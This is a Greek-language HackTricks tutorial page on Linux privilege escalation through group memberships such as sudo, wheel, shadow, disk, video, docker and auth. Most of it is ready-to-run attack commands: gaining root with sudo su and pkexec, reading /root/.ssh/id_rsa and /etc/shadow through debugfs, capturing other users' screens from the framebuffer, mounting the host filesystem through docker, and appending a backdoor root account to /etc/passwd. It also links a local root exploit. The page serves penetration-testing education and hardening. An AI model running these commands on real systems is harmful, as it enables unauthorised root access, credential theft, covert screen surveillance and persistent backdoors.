# Ενδιαφέρουσες Ομάδες - Προνομιούχα Ανέλιξη στο Linux

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ομάδες Sudo/Admin

### **PE - Μέθοδος 1**

**Μερικές φορές**, **από προεπιλογή (ή επειδή κάποιο λογισμικό το απαιτεί)** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε μερικές από αυτές τις γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για να **γίνετε root μπορείτε απλά να εκτελέσετε**:
```
sudo su
```
### Ανόδου Προνομιών - Μέθοδος 2

Βρείτε όλα τα suid δυαδικά αρχεία και ελέγξτε αν υπάρχει το δυαδικό αρχείο **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Εάν ανακαλύψετε ότι το δυαδικό **pkexec είναι ένα SUID δυαδικό** και ανήκετε στις ομάδες **sudo** ή **admin**, πιθανώς μπορείτε να εκτελέσετε δυαδικά ως sudo χρησιμοποιώντας το `pkexec`.\
Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες που υπάρχουν μέσα στην **πολιτική polkit**. Αυτή η πολιτική αναγνωρίζει ποιες ομάδες μπορούν να χρησιμοποιήσουν το `pkexec`. Ελέγξτε το με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες έχουν τη δυνατότητα να εκτελέσουν τις εντολές **pkexec** και **από προεπιλογή** σε ορισμένες διανομές Linux εμφανίζονται οι ομάδες **sudo** και **admin**.

Για να **γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Εάν προσπαθήσετε να εκτελέσετε την εντολή **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν είναι επειδή δεν έχετε δικαιώματα, αλλά επειδή δεν είστε συνδεδεμένοι χωρίς γραφικό περιβάλλον**. Και υπάρχει μια λύση για αυτό το πρόβλημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές συνεδρίες ssh**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Ομάδα Wheel

Μερικές φορές, από προεπιλογή μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε αυτήν τη γραμμή:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα wheel μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για να **γίνετε root μπορείτε απλά να εκτελέσετε**:
```
sudo su
```
## Ομάδα Shadow

Οι χρήστες από την **ομάδα shadow** μπορούν να **διαβάσουν** το αρχείο **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Διαβάστε το αρχείο και προσπαθήστε να **αποκρυπτογραφήσετε μερικά hashes**.

## Ομάδα Δίσκου

Αυτό το προνόμιο είναι σχεδόν **ισοδύναμο με την πρόσβαση ως root** καθώς μπορείτε να έχετε πρόσβαση σε όλα τα δεδομένα μέσα στη μηχανή.

Αρχεία: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημείωση ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **εγγράψετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, αν προσπαθήσετε να **εγγράψετε αρχεία που ανήκουν στο χρήστη root** (όπως το `/etc/shadow` ή το `/etc/passwd`), θα λάβετε ένα σφάλμα "**Άρνηση πρόσβασης**".

## Ομάδα Video

Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει ένα αποτέλεσμα όπως το παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος φυσικά** σε ένα τερματικό στο μηχάνημα.

Η **ομάδα video** έχει πρόσβαση για να παρακολουθήσει την οθόνη εξόδου. Βασικά μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό, χρειάζεται να **αποκτήσετε την τρέχουσα εικόνα της οθόνης** σε ακατέργαστα δεδομένα και να πάρετε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να ανοίξετε την ακατέργαστη εικόνα, μπορείτε να χρησιμοποιήσετε το GIMP, επιλέξτε το αρχείο `screen.raw` και επιλέξτε ως τύπο αρχείου **Raw image data**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Στη συνέχεια, τροποποιήστε το Πλάτος και το Ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και ελέγξτε διάφορους Τύπους Εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη):

![](<../../../.gitbook/assets/image (288).png>)

## Ομάδα Root

Φαίνεται ότι από προεπιλογή, τα μέλη της ομάδας root μπορούν να έχουν πρόσβαση για να τροποποιήσουν ορισμένα αρχεία ρυθμίσεων υπηρεσιών ή ορισμένα αρχεία βιβλιοθηκών ή άλλα ενδιαφέροντα πράγματα που μπορούν να χρησιμοποιηθούν για να αναβαθμιστούν τα δικαιώματα...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Ομάδα Docker

Μπορείτε να **προσαρτήσετε το αρχείοσύστημα της ρίζας του κεντρικού υπολογιστή σε έναν τόμο της εικόνας**, έτσι ώστε όταν ξεκινά η εικόνα, φορτώνει αμέσως ένα `chroot` σε αυτόν τον τόμο. Αυτό σας δίνει αποτελεσματικά δικαιώματα root στον υπολογιστή.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Τέλος, αν δεν σας αρέσει καμία από τις προτάσεις που αναφέρθηκαν προηγουμένως, ή αν δεν λειτουργούν για κάποιο λόγο (π.χ. προστασία της πρόσβασης στο docker api), μπορείτε πάντα να **εκτελέσετε ένα προνομιούχο container και να δραπετεύσετε από αυτό**, όπως εξηγείται εδώ:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Αν έχετε δικαιώματα εγγραφής στον docker socket, διαβάστε [**αυτή την ανάρτηση για το πώς να αναβαθμίσετε τα δικαιώματα κατάχρησης του docker socket**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Ομάδα lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Ομάδα Adm

Συνήθως τα μέλη της ομάδας **`adm`** έχουν δικαιώματα για **ανάγνωση αρχείων καταγραφής** που βρίσκονται μέσα στον φάκελο _/var/log/_.\
Επομένως, αν έχετε παραβιάσει έναν χρήστη μέσα σε αυτήν την ομάδα, οπωσδήποτε πρέπει να **ελέγξετε τα αρχεία καταγραφής**.

## Ομάδα Auth

Στο OpenBSD, συνήθως η ομάδα **auth** μπορεί να γράψει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
Αυτά τα δικαιώματα μπορούν να καταχραστούν με την ακόλουθη εκμετάλλευση για να **αναβαθμίσετε τα δικαιώματα** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
